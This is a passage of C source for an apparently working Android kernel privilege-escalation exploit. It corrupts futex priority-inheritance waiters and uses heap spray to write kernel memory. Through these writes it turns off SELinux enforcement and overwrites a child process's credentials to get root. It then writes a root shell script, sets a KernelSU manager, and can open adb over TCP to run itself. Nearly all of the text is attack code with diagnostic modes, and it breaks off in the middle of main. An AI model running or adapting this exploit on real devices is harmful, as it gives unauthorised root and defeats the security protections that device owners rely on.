    "rm -f /data/local/tmp/.ghostlock_w1\n"
    "APK=$(pm path com.resukisu.resukisu 2>/dev/null | sed 's/package://')\n"
    "if [ -n \"$APK\" ] && [ -x /data/adb/ksud ]; then\n"
    "  /data/adb/ksud kernel dynamic-manager set-apk \"$APK\" 2>/dev/null && echo '[+] dynamic manager set'\n"
    "fi\n"
    "echo 1 > /sys/fs/selinux/enforce 2>/dev/null\n"
    "echo '[*]' $(id) 'enforce='$(cat /sys/fs/selinux/enforce 2>/dev/null)\n"
    "echo '[+] done'\n"
    "if [ -t 0 ]; then exec /system/bin/sh -i; fi\n";
  write(sfd, script, strlen(script));
  close(sfd);
}

/* perf_find_task - only used when perf is available (shell context) */
static uintptr_t perf_find_task(void) {
  struct perf_event_attr pe;
  memset(&pe, 0, sizeof(pe));
  pe.type = PERF_TYPE_SOFTWARE;
  pe.size = sizeof(pe);
  pe.config = PERF_COUNT_SW_CPU_CLOCK;
  pe.sample_period = 5000;
  pe.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_REGS_INTR;
  pe.sample_regs_intr = (1ULL << 32) - 1;
  pe.disabled = 1;
  pe.exclude_user = 1;
  pe.exclude_hv = 1;
  pe.exclude_idle = 1;

  errno = 0;
  int fd = (int)syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0);
  if (fd < 0) { pr_error("perf_event_open failed errno=%d\n", errno); return 0; }
  size_t msz = 4096 * (1 + 32);
  void *buf = mmap(NULL, msz, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
  if (buf == MAP_FAILED) { pr_error("perf mmap failed errno=%d\n", errno); close(fd); return 0; }
  ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
  for (volatile int i = 0; i < 500000; i++) syscall(__NR_getpid);
  ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
  struct perf_event_mmap_page *hdr = buf;
  uint64_t head = hdr->data_head;
  __sync_synchronize();
  char *base = (char *)buf + 4096;
  size_t dsz = 4096 * 32;
  uint64_t pos = hdr->data_tail;
  uintptr_t cands[256]; int nc = 0;
  while (pos < head && nc < 256) {
    struct perf_event_header *ev = (void *)(base + (pos % dsz));
    if (ev->size == 0) break;
    if (ev->type == PERF_RECORD_SAMPLE) {
      char *p = (char *)ev + sizeof(*ev);
      p += 8; /* skip IP */
      uint64_t abi = *(uint64_t *)p; p += 8;
      if (abi == 1 || abi == 2) {
        uint64_t *regs = (uint64_t *)p;
        for (int i = 0; i < 32 && nc < 256; i++) {
          uint64_t v = regs[i];
          if (v > 0xffffff8000000000ULL && v < 0xfffffffe00000000ULL)
            cands[nc++] = v;
        }
      }
    }
    pos += ev->size;
  }
  hdr->data_tail = head; munmap(buf, msz); close(fd);
  if (!nc) return 0;
  uintptr_t best = 0; int best_cnt = 0;
  for (int i = 0; i < nc; i++) {
    int cnt = 0;
    for (int j = 0; j < nc; j++) if (cands[j] == cands[i]) cnt++;
    if (cnt > best_cnt) { best_cnt = cnt; best = cands[i]; }
  }
  pr_info("perf task: 0x%016zx (%d/%d votes)\n", best, best_cnt, nc);
  return best;
}

struct child_pipes { int task_r, task_w, cmd_r, cmd_w, uid_r, uid_w; };

static void child_main(struct child_pipes *p) {
  close(p->task_r); close(p->cmd_w); close(p->uid_r);
  uintptr_t my_task = perf_find_task();
  write(p->task_w, &my_task, sizeof(my_task));
  close(p->task_w);
  if (!my_task) _exit(1);
  char cmd;
  while (read(p->cmd_r, &cmd, 1) == 1) {
    if (cmd == 'C') { uint32_t uid = getuid(); write(p->uid_w, &uid, sizeof(uid)); }
    else if (cmd == 'G') break;
  }
  close(p->cmd_r); close(p->uid_w);
  if (getuid() != 0) _exit(1);
  pid_t gc = fork();
  if (gc == 0) {
    int efd = open("/sys/fs/selinux/enforce", O_WRONLY);
    if (efd >= 0) { write(efd, "0", 1); close(efd); }
    execl("/system/bin/sh", "sh", "/data/local/tmp/.ghostlock_root.sh", NULL);
    _exit(1);
  }
  if (gc > 0) waitpid(gc, NULL, 0);
  for (;;) pause();
}

static pid_t spawn_child(struct child_pipes *p) {
  int p1[2], p2[2], p3[2];
  if (pipe(p1) < 0 || pipe(p2) < 0 || pipe(p3) < 0) return -1;
  p->task_r = p1[0]; p->task_w = p1[1];
  p->cmd_r = p2[0]; p->cmd_w = p2[1];
  p->uid_r = p3[0]; p->uid_w = p3[1];
  pid_t child = fork();
  if (child < 0) return -1;
  if (child == 0) { child_main(p); _exit(1); }
  close(p->task_w); close(p->cmd_r); close(p->uid_w);
  return child;
}

int run_exploit(int argc, char **argv) {
  (void)argc; (void)argv;
  disable_rseq_for_thread();
  set_unbuffer();
  set_limit();

  if (!active_offsets && select_offsets() < 0) return 1;

  log_startup_context();
  init_ashmem_path();
  pin_to_core(CORE);

  kaslr_slide = 0;
  kaslr_base = KIMAGE_TEXT_BASE;
  kaslr_done = 1;

  timer_reset();
  TIMER("exploit start");

  int diag_mode = env_int_range("DIAG", 0, 0, 9);
  /* DIAG=7 跳过 heap spray：本实验只靠 real lock + setsockopt stamp，不需 fake page。 */
  /* ===== 重建121（gK28）：DIAG=8 需要内核页作为伪锁 =====
   * [实测] CONFIG_ARM64_PAN=y => 伪锁不能放用户页，必须是内核地址。
   * DIAG=8 走 heap spray 拿 page_base；DIAG=7/9 仍不拿（保持旧对照语义）。
   */
  if (diag_mode == 8 && env_flag("DIAG8_SPRAY", 1)) {
    /* ★ 必须用 4.14 waiter 基址。4.14 的 rt_mutex_waiter.tree_entry 在 +0x00，
     * 而 payload 里 FAKE_WAITER_* 常量是 6.1 布局（比 4.14 多 0x20）。
     * 因此 rb_leftmost 必须指向 fake_w0+0x20，使 w->lock 读到
     * *(fake_w0+0x20+0x38) = *(fake_w0+0x58) = put64 写入的 fake_lock，
     * 才能通过 rt_mutex_top_waiter 的 BUG_ON(w->lock != lock)。
     * 若用 fake_w0，w->lock 会读到 *(fake_w0+0x38)=write_left，必然 BUG_ON。 */
    setenv("WAITER_BASE_4_14", "1", 1);
    slab_drain();
    ckpt_begin("d8_heap_spray");
    page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
    ckpt_end("d8_heap_spray");
    if (!page_base) {
      pr_error("DIAG=8: heap spray failed, cannot build fake lock\n");
      return 1;
    }
    /* 伪锁放在 payload 页内 LOCK_OFF。关键：rb_leftmost(+0x10) 必须指向
     * 伪 waiter，且伪 waiter->lock(+0x38) 必须 == 伪锁（过 BUG_ON）。
     * 这两项由 prepare_skb_payload 的 WAITER_BASE_4_14 分支写入：
     *   LOCK_OFF+0x08 = wbase, LOCK_OFF+0x10 = wbase；
     *   W0_OFF+FAKE_WAITER_LOCK_OFF(0x58) = fake_lock
     * 4.14 的 rt_mutex_waiter.tree_entry 在 +0x00，故 wbase 必须是 waiter 基址。
     */
    pr_info("DIAG=8: kernel page base=%016zx fake_lock=%016zx\n",
            page_base, fake_lock);
    /* 把 page_base / fake_lock 交给 stamp（子线程读全局） */
    atomic_store(&stamp_obs_fd, (long)stamp_fd);
  }
  if (diag_mode == 7 || diag_mode == 8 || diag_mode == 9) {
    pr_info("DIAG=%d: skip heap spray (real-lock route, no fake page)\n", diag_mode);
    atomic_store(&fire_from_main, env_flag("FIRE_FROM_MAIN", 0));
    run_main_route_threads();
    pr_info("DIAG=%d: run_main_route_threads returned OK\n", diag_mode);
    return 0;
  }
  if (diag_mode == 1 || diag_mode == 2) {
    pr_info("DIAG=%d: skipping heap spray, testing futex+PI path directly\n", diag_mode);
    pselect_child_node = 1;
    set_pselect_write_mode(data_addr(SELINUX_ENFORCING), 0, 1);
    atomic_store(&fire_from_main, env_flag("FIRE_FROM_MAIN", 0));
    run_main_route_threads();
    pr_info("DIAG=%d: run_main_route_threads returned OK\n", diag_mode);
    clear_pselect_write();
    return 0;
  }

  write_root_script();

  /* Phase 1: Disable SELinux */
  int selinux_ok = check_selinux_off();
  if (!selinux_ok) {
    slab_drain();
    TIMER("pre-W1 drain");
    for (int att = 1; att <= 5 && !selinux_ok; att++) {
      pr_info("Write 1 attempt %d/5\n", att);
      do_one_write(data_addr(SELINUX_ENFORCING), "W1: SELinux", 1);
      usleep(100000);
      if (check_selinux_off()) { pr_success("SELinux DISABLED\n"); selinux_ok = 1; }
    }
    if (!selinux_ok) { pr_error("Write 1 failed\n"); return 1; }
    TIMER("Write 1 complete");
  } else {
    pr_success("SELinux already off\n");
  }

  /* Phase 2: Find child task_struct + cred overwrite */
  slab_drain();
  TIMER("pre-W2 drain");

  struct child_pipes pipes;
  pid_t child = spawn_child(&pipes);
  if (child < 0) { pr_error("fork failed\n"); return 1; }

  uintptr_t child_task = 0;
  read(pipes.task_r, &child_task, sizeof(child_task));
  close(pipes.task_r);
  TIMER("perf_find_task done");

  if (!child_task) {
    /* perf failed (seccomp?) — retry once */
    pr_info("perf returned 0, retrying...\n");
    waitpid(child, NULL, 0);
    child = spawn_child(&pipes);
    if (child < 0) { pr_error("retry fork failed\n"); return 1; }
    read(pipes.task_r, &child_task, sizeof(child_task));
    close(pipes.task_r);
  }

  if (!child_task) {
    pr_error("Cannot find task_struct (perf blocked by seccomp?)\n");
    close(pipes.cmd_w);
    waitpid(child, NULL, 0);
    return 1;
  }

  pr_info("child_pid=%d child_task=0x%016zx\n", child, child_task);
  pselect_child_node = 1;

  int got_root = 0;
  for (int round = 1; round <= 10 && !got_root; round++) {
    pr_info("round %d/10: cred write\n", round);
    slab_drain();
    do_one_write(child_task + TASK_CRED_OFF, "W2: cred", 2);
    usleep(50000);
    write(pipes.cmd_w, "C", 1);
    uint32_t child_uid = 9999;
    read(pipes.uid_r, &child_uid, sizeof(child_uid));
    pr_info("child uid = %u\n", child_uid);
    if (child_uid == 0) { pr_success("child is root!\n"); got_root = 1; }
  }

  write(pipes.cmd_w, "G", 1);
  close(pipes.cmd_w); close(pipes.uid_r);

  if (!got_root) {
    pr_error("failed after 10 rounds\n");
    waitpid(child, NULL, 0);
    return 1;
  }

  sleep(2);
  TIMER("exploit complete");

  /* Wait for KSU su to become available, then fix SELinux policycap */
  pr_info("waiting for su...\n");
  for (int i = 0; i < 60; i++) {
    if (system("su -c 'id' > /dev/null 2>&1") == 0) {
      pr_success("su ready, fixing SELinux policy\n");
      system("su -c 'load_policy /sys/fs/selinux/policy' > /dev/null 2>&1");
      pr_success("load_policy done\n");
      break;
    }
    sleep(1);
  }

  return 0;
}

int install_embedded_wallpaper(void) { return 0; }

static int run_write1_only(void);
extern int mini_adb_shell(const char *cmd);

/* --dryrun: resolve offsets and validate environment WITHOUT touching kernel
 * memory. Safe to run anywhere. */
static int run_dryrun(void) {
  set_unbuffer();
  set_limit();
  if (!active_offsets && select_offsets() < 0) return 1;

  const struct kernel_offsets *o = active_offsets;
  printf("========================================\n");
  printf(" ares dry-run — offsets loaded from boot.img\n");
  printf("========================================\n");
  printf("uname_r            = %s\n", o->uname_r);
  printf("KIMAGE_TEXT_BASE   = 0x%016llx\n", (unsigned long long)o->kimage_text_base);
  printf("P0_PAGE_OFFSET     = 0x%016llx\n", (unsigned long long)o->p0_page_offset);
  printf("P0_PHYS_OFFSET     = 0x%016llx\n", (unsigned long long)o->p0_phys_offset);
  printf("P0_KERNEL_PHYS_LOAD= 0x%016llx\n", (unsigned long long)o->p0_kernel_phys_load);
  printf("--- symbols (VA) ---\n");
  printf("init_task          = 0x%016llx\n", (unsigned long long)text_addr(INIT_TASK));
  printf("init_cred          = 0x%016llx\n", (unsigned long long)text_addr(INIT_CRED));
  printf("init_uts_ns        = 0x%016llx\n", (unsigned long long)text_addr(INIT_UTS_NS));
  printf("empty_zero_page    = 0x%016llx\n", (unsigned long long)text_addr(EMPTY_ZERO_PAGE));
  printf("selinux_enforcing  = 0x%016llx\n", (unsigned long long)text_addr(SELINUX_ENFORCING));
  printf("kmalloc_caches     = 0x%016llx\n", (unsigned long long)text_addr(KMALLOC_CACHES));
  printf("ashmem_fops        = 0x%016llx\n", (unsigned long long)text_addr(ASHMEM_FOPS));
  printf("ashmem_misc_fops   = 0x%016llx\n", (unsigned long long)text_addr(ASHMEM_MISC_FOPS));
  printf("anon_pipe_buf_ops  = 0x%016llx\n", (unsigned long long)text_addr(ANON_PIPE_BUF_OPS));
  printf("ashmem_open        = 0x%016llx\n", (unsigned long long)text_addr(ASHMEM_OPEN));
  printf("ashmem_ioctl       = 0x%016llx\n", (unsigned long long)text_addr(ASHMEM_IOCTL));
  printf("ashmem_mmap        = 0x%016llx\n", (unsigned long long)text_addr(ASHMEM_MMAP));
  printf("ashmem_release     = 0x%016llx\n", (unsigned long long)text_addr(ASHMEM_RELEASE));
  printf("configfs_read_iter = 0x%016llx (configfs_read_file)\n",
         (unsigned long long)text_addr(CONFIGFS_READ_ITER));
  printf("configfs_bin_write = 0x%016llx (configfs_write_bin_file)\n",
         (unsigned long long)text_addr(CONFIGFS_BIN_WRITE_ITER));
  printf("noop_llseek        = 0x%016llx\n", (unsigned long long)text_addr(NOOP_LLSEEK));
  printf("--- struct offsets ---\n");
  printf("task.cred          = 0x%x  real_cred=0x%x\n", TASK_CRED_OFF, TASK_REAL_CRED_OFF);
  printf("task.pi_lock       = 0x%x  pi_waiters=0x%x  pi_blocked_on=0x%x\n",
         FAKE_TASK_PI_LOCK_OFF, FAKE_TASK_PI_WAITERS_OFF, FAKE_TASK_PI_BLOCKED_ON_OFF);
  printf("task.pid=0x%x tgid=0x%x comm=0x%x tasks=0x%x seccomp=0x%x\n",
         TASK_PID_OFF, TASK_TGID_OFF, TASK_COMM_OFF, TASK_TASKS_OFF, TASK_SECCOMP_OFF);
  printf("cred.uid=0x%x securebits=0x%x caps=0x%x security=0x%x\n",
         CRED_UID_OFF, CRED_SECUREBITS_OFF, CRED_CAPS_OFF, CRED_SECURITY_OFF);
  printf("waiter: tree=0x%x pi_tree=0x%x task=0x%x lock=0x%x prio=0x%x\n",
         WAITER_TREE_ENTRY_OFF, WAITER_PI_TREE_ENTRY_OFF, WAITER_TASK_OFF,
         WAITER_LOCK_OFF, WAITER_PRIO_OFF);
  printf("cfg: page=%d needs_read_fill=%d bin_buffer=%d bin_buffer_size=%d cb_max=%d\n",
         CFG_PAGE_OFF, CFG_NEEDS_READ_FILL_OFF, CFG_BIN_BUFFER_OFF,
         CFG_BIN_BUFFER_SIZE_OFF, CFG_CB_MAX_SIZE_OFF);
   printf("pselect_waiter_word_shift = %d\n", PSELECT_WAITER_WORD_SHIFT);
   gk110_report_coords();
  printf("--- environment ---\n");
  log_startup_context();
  init_ashmem_path();
  printf("ashmem path        = %s\n", ashmem_path);
  int afd = open_ashmem_device();
  printf("open ashmem        = %s (fd=%d)\n", afd >= 0 ? "OK" : "FAIL", afd);
  if (afd >= 0) close(afd);
  printf("=== dry-run complete ===\n");
  return 0;
}

/* --bootstrap mode: runs from app context (any UID, with seccomp).
 * 1) Write 1 → SELinux off
 * 2) setprop to enable adb TCP on 5555 (SELinux off → property_service allows it)
 * 3) mini-adb connects to 127.0.0.1:5555, authenticates with pre-pushed key,
 *    runs full exploit via adb shell (no app seccomp → perf works)
 */
static int run_bootstrap(void) {
  log_startup_context();

  int ret = run_write1_only();
  if (ret != 0) return ret;

  /* Wait for adb TCP on port 5555 */
  pr_info("Waiting for adb TCP on port 5555...\n");
  for (int i = 0; i < 30; i++) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in addr = {
      .sin_family = AF_INET,
      .sin_port = htons(5555),
      .sin_addr.s_addr = htonl(0x7f000001)
    };
    int c = (sock >= 0) ? connect(sock, (struct sockaddr *)&addr, sizeof(addr)) : -1;
    if (sock >= 0) close(sock);
    if (c == 0) {
      pr_success("adbd ready on port 5555 (attempt %d)\n", i + 1);
      goto tcp_ready;
    }
    usleep(1000000);
  }
  pr_error("adbd not on TCP 5555 after 30s\n");
  return 1;
tcp_ready:
  usleep(200000);
  pr_info("Connecting via mini-adb...\n");
  int adb_ret = mini_adb_shell("/data/local/tmp/a/e");
  pr_info("mini-adb returned %d\n", adb_ret);

  return adb_ret;
}

static int run_write1_only(void) {
  disable_rseq_for_thread();
  set_unbuffer();
  set_limit();
  if (!active_offsets && select_offsets() < 0) return 1;
  init_ashmem_path();
  pin_to_core(CORE);
  kaslr_slide = 0;
  kaslr_base = KIMAGE_TEXT_BASE;
  kaslr_done = 1;

  if (check_selinux_off()) {
    pr_success("SELinux already off\n");
    return 0;
  }

  for (int att = 1; att <= 20; att++) {
    slab_drain();
    pr_info("Write 1 attempt %d/20\n", att);
    do_one_write(data_addr(SELINUX_ENFORCING), "W1: SELinux", 1);
    usleep(100000);
    if (check_selinux_off()) {
      pr_success("SELinux DISABLED\n");
      return 0;
    }
  }
  pr_error("Write 1 failed after 20 attempts\n");
  return 1;
}

/* --w1once: exactly ONE real Write-1 attempt (selinux_enforcing -> 0). */
static int run_w1_once(void) {
  disable_rseq_for_thread();
  set_unbuffer();
  set_limit();
  if (!active_offsets && select_offsets() < 0) return 1;
  init_ashmem_path();
  pin_to_core(CORE);
  kaslr_slide = 0;
  kaslr_base = KIMAGE_TEXT_BASE;
  kaslr_done = 1;
  ckpt_open();
  if (check_selinux_off()) { pr_success("SELinux already off\n"); return 0; }
  /* Allow firing the consumer while the waiter is still blocked (right window). */
  atomic_store(&fire_from_main, env_flag("FIRE_FROM_MAIN", 0));
  ckpt_begin("w1once_slab_drain");
  slab_drain();
  ckpt_end("w1once_slab_drain");
  ckpt_begin("w1once_write");
  do_one_write(data_addr(SELINUX_ENFORCING), "W1: SELinux", 1);
  ckpt_end("w1once_write");
  usleep(100000);
  int off = check_selinux_off();
  pr_info("W1once: selinux_off=%d\n", off);
  return off ? 0 : 1;
}

/* --shift N : run the real pselect-overlay + PI-walk with PSELECT_SHIFT=N.
 * Used to calibrate pselect_waiter_word_shift: if the fd_set overlay lands on
 * the right waiter words the PI walk survives; a wrong shift panics. */
static int run_shift(int shift) {
  disable_rseq_for_thread();
  set_unbuffer();
  set_limit();
  if (!active_offsets && select_offsets() < 0) return 1;
  init_ashmem_path();
  pin_to_core(CORE);
  kaslr_slide = 0;
  kaslr_base = KIMAGE_TEXT_BASE;
  kaslr_done = 1;
  ckpt_open();
  char sb[32];
  snprintf(sb, sizeof(sb), "%d", shift);
  setenv("PSELECT_SHIFT", sb, 1);
  /* Use the ORIGINAL trigger (waiter fires the consumer right after its futex
   * returns, i.e. while the fd_set overlay is in place and the PI walk runs).
   * That is the scenario whose fake-waiter layout the shift calibrates. */
  setenv("FIRE_FROM_MAIN", "0", 1);
  atomic_store(&fire_from_main, 0);
  char tag[64];
  snprintf(tag, sizeof(tag), "SHIFT=%d start selinux_off=%d", shift,
           check_selinux_off());
  ckpt_begin(tag);
  pr_info("==== SHIFT=%d ====\n", shift);
  pselect_child_node = 1;
  set_pselect_write_mode(data_addr(SELINUX_ENFORCING), 0, 1);
  ckpt_begin("shift_spray");
  page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
  ckpt_end("shift_spray");
  if (!page_base) { pr_error("SHIFT=%d heap spray failed\n", shift); return 1; }
  ckpt_begin("shift_route");
  run_main_route_threads();
  ckpt_end("shift_route");
  clear_pselect_write();
  usleep(100000);
  int off = check_selinux_off();
  pr_info("SHIFT=%d done selinux_off=%d\n", shift, off);
  ckpt_begin(off ? "SHIFT=OK selinux_off" : "SHIFT=done no-write");
  return off ? 0 : 1;
}

static void *stage2_blocker(void *arg) {
  (void)arg;
  pin_to_core(CORE);
  ckpt_begin("s2_blocker_lock_target");
  long r = futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  ckpt_end("s2_blocker_lock_target");
  pr_info("STAGE2 blocker LOCK_PI ret=%ld errno=%d\n", r, errno);
  ckpt_begin("s2_blocker_unlock_target");
  futex_op(&f_pi_target, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
  ckpt_end("s2_blocker_unlock_target");
  return NULL;
}

/* --stage N : bisect which primitive wedges the kernel. Every kernel syscall
 * is bracketed by ckpt_begin/ckpt_end so a watchdog reset leaves a user-space
 * breadcrumb pointing at the exact step that hung.
 *   STAGE=1: LOCK_PI/UNLOCK_PI on f_pi_target (no contention, no waiter).
 *   STAGE=2: add real waiter — second thread blocks on f_pi_target, then is
 *            woken via UNLOCK_PI (real rt_mutex_waiter alloc/free on stack).
 *   STAGE=3: full 3-thread choreography, consumer thread inert (no PI walk).
 *   STAGE=4: full choreography + consumer sched_setattr (PI walk) — == DIAG=1.
 */
static int run_stage(int stage) {
  disable_rseq_for_thread();
  set_unbuffer();
  set_limit();
  if (!active_offsets && select_offsets() < 0) return 1;
  log_startup_context();
  init_ashmem_path();
  pin_to_core(CORE);
  kaslr_slide = 0;
  kaslr_base = KIMAGE_TEXT_BASE;
  kaslr_done = 1;
  ckpt_open();
  {
    char b[64];
    snprintf(b, sizeof(b), "STAGE=%d START", stage);
    ckpt_begin(b);
  }
  pr_info("==== STAGE=%d ====\n", stage);

  if (stage <= 1) {
    ckpt_begin("s1_lock_target");
    long r = futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
    ckpt_end("s1_lock_target");
    pr_info("STAGE1 LOCK_PI target ret=%ld errno=%d\n", r, errno);
    if (r == 0) {
      ckpt_begin("s1_unlock_target");
      futex_op(&f_pi_target, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
      ckpt_end("s1_unlock_target");
    }
    pr_success("STAGE=1 PASSED\n");
    return 0;
  }

  if (stage == 2) {
    ckpt_begin("s2_main_lock_target");
    long r = futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
    ckpt_end("s2_main_lock_target");
    pr_info("STAGE2 main LOCK_PI target ret=%ld errno=%d\n", r, errno);
    if (r != 0) { pr_error("STAGE2 could not take target lock\n"); return 1; }
    pthread_t blk;
    SYSCHK(pthread_create(&blk, NULL, stage2_blocker, NULL));
    usleep(100000);  /* let blocker block on target -> real waiter on its stack */
    ckpt_begin("s2_main_unlock_target");
    futex_op(&f_pi_target, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
    ckpt_end("s2_main_unlock_target");
    pthread_join(blk, NULL);
    pr_success("STAGE=2 PASSED\n");
    return 0;
  }

  /* stage >= 3: full choreography */
  atomic_store(&consumer_disabled, stage < 4 ? 1 : 0);
  pr_info("STAGE=%d consumer_disabled=%d\n", stage,
          atomic_load(&consumer_disabled));
  pselect_child_node = 1;
  set_pselect_write_mode(data_addr(SELINUX_ENFORCING), 0, 1);
  run_main_route_threads();
  clear_pselect_write();
  pr_success("STAGE=%d PASSED\n", stage);
  return 0;
}

/* ── --tcpcheck：独立验证 TCP 阻塞契约（gK43）────────────────────────
 * 不依赖 page_base / fake_lock / fake_fops / H1 mm 泄漏，
 * 只回答一个问题：按 sm_tcp_gate 的参数搭出来的这条 TCP，
 * sendmsg 到底会不会阻塞？
 *
 * 方法（三层递进，层层加证据）：
 *   L1  TCP_INFO：state 是否 ESTABLISHED、snd_mss 是否 536、
 *       snd_cwnd / rcv_space 是否足够小
 *   L2  MSG_DONTWAIT 单次探测：EAGAIN ⇒ 内核明确拒绝接收 ⇒ 阻塞契约成立
 *   L3  MSG_DONTWAIT 循环灌满：连续灌直到 EAGAIN，记录灌入总量和次数
 *       （总量 ≈ SO_SNDBUF 且远小于请求量 ⇒ 强证据）
 * 然后可选 L4：恢复阻塞模式，用 alarm 保护，实测 sendmsg 是否卡住。
 */
/* run_bfself 的实现已移至 util.c（gK51） */

int run_tcpcheck(void) {
  ckpt_open();
  pr_info("==== TCPCHECK start ====\n");

  int snd = -1, peer = -1;
  if (!sm_tcp_gate(&snd, &peer)) {
    pr_error("TCPCHECK: tcp gate failed errno=%d\n", errno);
    ckpt_val("tc_gate", 0);
    return 1;
  }
  ckpt_val("tc_gate", 1);

  /* 拿实际生效的 socket 参数（内核会把 setbuf 值翻倍） */
  {
    int sbv = 0; socklen_t sl = 4;
    getsockopt(snd, SOL_SOCKET, SO_SNDBUF, &sbv, &sl);
    ckpt_val("tc_sndbuf_eff", (long)sbv);
    int rbv = 0; sl = 4;
    getsockopt(peer, SOL_SOCKET, SO_RCVBUF, &rbv, &sl);
    ckpt_val("tc_peer_rcvbuf_eff", (long)rbv);
    int wcv = 0; sl = 4;
    getsockopt(peer, IPPROTO_TCP, TCP_WINDOW_CLAMP, &wcv, &sl);
    ckpt_val("tc_peer_wclamp", (long)wcv);
    int msv = 0; sl = 4;
    getsockopt(peer, IPPROTO_TCP, TCP_MAXSEG, &msv, &sl);
    ckpt_val("tc_peer_maxseg", (long)msv);
  }

  /* ── L1: TCP_INFO ── */
  {
    unsigned char ti[sizeof(struct sm_tcpinfo_414)];
    memset(ti, 0, sizeof(ti));
    socklen_t tl = sizeof(ti);
    int g = getsockopt(snd, IPPROTO_TCP, TCP_INFO, ti, &tl);
    ckpt_val("tc_tcpi_ret", (long)g);
    ckpt_val("tc_tcpi_len", (long)tl);
    if (g == 0) {
      uint32_t v;
      ckpt_val("tc_state", (long)ti[0x00]);
      memcpy(&v, ti + SM_TCPI_SND_MSS, 4);   ckpt_val("tc_snd_mss", (long)v);
      memcpy(&v, ti + SM_TCPI_RCV_MSS, 4);   ckpt_val("tc_rcv_mss", (long)v);
      memcpy(&v, ti + SM_TCPI_SND_CWND, 4);  ckpt_val("tc_snd_cwnd", (long)v);
      memcpy(&v, ti + SM_TCPI_RCV_SPACE, 4); ckpt_val("tc_rcv_space", (long)v);
      memcpy(&v, ti + SM_TCPI_SND_SSH, 4);   ckpt_val("tc_snd_ssthresh", (long)v);
    }
  }

  /* ── L2: MSG_DONTWAIT 单次探测 ── */
  static unsigned char big[0x200000];
  memset(big, 0x42, sizeof(big));
  struct iovec iov1[1];
  iov1[0].iov_base = big;
  iov1[0].iov_len  = sizeof(big);
  struct msghdr mh1;
  memset(&mh1, 0, sizeof(mh1));
  mh1.msg_iov = iov1;
  mh1.msg_iovlen = 1;

  errno = 0;
  ssize_t r2 = sendmsg(snd, &mh1, MSG_DONTWAIT | MSG_NOSIGNAL);
  int e2 = errno;
  ckpt_val("tc_probe1_ret", (long)r2);
  ckpt_val("tc_probe1_errno", (long)e2);
  ckpt_val("tc_probe1_blocking",
           (r2 < 0 && (e2 == EAGAIN || e2 == EWOULDBLOCK)) ? 1 : 0);
  pr_info("TCPCHECK L2: ret=%zd errno=%d\n", r2, e2);

  /* ── L3: 循环灌满（每轮 64KB，最多 512 轮 = 32MB）── */
  {
    static unsigned char chunk[0x10000];
    memset(chunk, 0x43, sizeof(chunk));
    struct iovec iov3[1];
    iov3[0].iov_base = chunk;
    iov3[0].iov_len  = sizeof(chunk);
    struct msghdr mh3;
    memset(&mh3, 0, sizeof(mh3));
    mh3.msg_iov = iov3;
    mh3.msg_iovlen = 1;
    long total = 0;
    int rounds = 0, eagain = 0;
    for (int i = 0; i < 512; i++) {
      errno = 0;
      ssize_t r = sendmsg(snd, &mh3, MSG_DONTWAIT | MSG_NOSIGNAL);
      if (r < 0) {
        eagain = errno;
        break;
      }
      total += (long)r;
      rounds++;
      if (r == 0) break;
    }
    ckpt_val("tc_fill_total", total);
    ckpt_val("tc_fill_rounds", (long)rounds);
    ckpt_val("tc_fill_errno", (long)eagain);
    /* 灌满成功判据：总量接近 sndbuf(<=256KB) 且远小于 32MB 且最终 EAGAIN */
    ckpt_val("tc_fill_blocked",
             (eagain == EAGAIN || eagain == EWOULDBLOCK) ? 1 : 0);
    pr_info("TCPCHECK L3: total=%ld rounds=%d errno=%d\n", total, rounds, eagain);
  }

  /* ── L4: 阻塞模式实测（可选，TCPCHECK_L4=1）── */
  if (env_flag("TCPCHECK_L4", 0)) {
    struct timeval tv = { .tv_sec = 2, .tv_usec = 0 };
    setsockopt(snd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
    struct iovec iov4[1];
    iov4[0].iov_base = big;
    iov4[0].iov_len  = sizeof(big);
    struct msghdr mh4;
    memset(&mh4, 0, sizeof(mh4));
    mh4.msg_iov = iov4;
    mh4.msg_iovlen = 1;
    struct timespec t0, t1;
    clock_gettime(CLOCK_MONOTONIC, &t0);
    errno = 0;
    ssize_t r4 = sendmsg(snd, &mh4, MSG_NOSIGNAL);
    int e4 = errno;
    clock_gettime(CLOCK_MONOTONIC, &t1);
    long ms = (t1.tv_sec - t0.tv_sec) * 1000L +
              (t1.tv_nsec - t0.tv_nsec) / 1000000L;
    ckpt_val("tc_l4_ret", (long)r4);
    ckpt_val("tc_l4_errno", (long)e4);
    ckpt_val("tc_l4_ms", ms);
    /* 阻塞判据：耗时 >= 1500ms 且返回 EAGAIN（超时） */
    ckpt_val("tc_l4_blocked",
             (ms >= 1500 && (e4 == EAGAIN || e4 == EWOULDBLOCK)) ? 1 : 0);
    pr_info("TCPCHECK L4: ret=%zd errno=%d ms=%ld\n", r4, e4, ms);
  } else {
    ckpt_val("tc_l4_skipped", 1);
  }

  pr_info("==== TCPCHECK done ====\n");
  close(snd);
  close(peer);
  return 0;
}

int main(int argc, char **argv) {
    if (argc > 1 && strcmp(argv[1], "--bfself") == 0)
        return run_bfself();
    if (argc > 1 && strcmp(argv[1], "--tcpcheck") == 0)
        return run_tcpcheck();
    if (argc > 2 && strcmp(argv[1], "--stage") == 0)
        return run_stage(atoi(argv[2]));
    if (argc > 2 && strcmp(argv[1], "--shift") == 0)
        return run_shift(atoi(argv[2]));
    if (argc > 1 && strcmp(argv[1], "--w1once") == 0)
        return run_w1_once();
    if (argc > 1 && strcmp(argv[1], "--slideleak") == 0)
        return run_slide_leak();
    if (argc > 1 && strcmp(argv[1], "--dryrun") == 0)
        return run_dryrun();
    if (argc > 1 && strcmp(argv[1], "--bootstrap") == 0)
        return run_bootstrap();
    if (argc > 1 && strcmp(argv[1], "--write1") == 0)
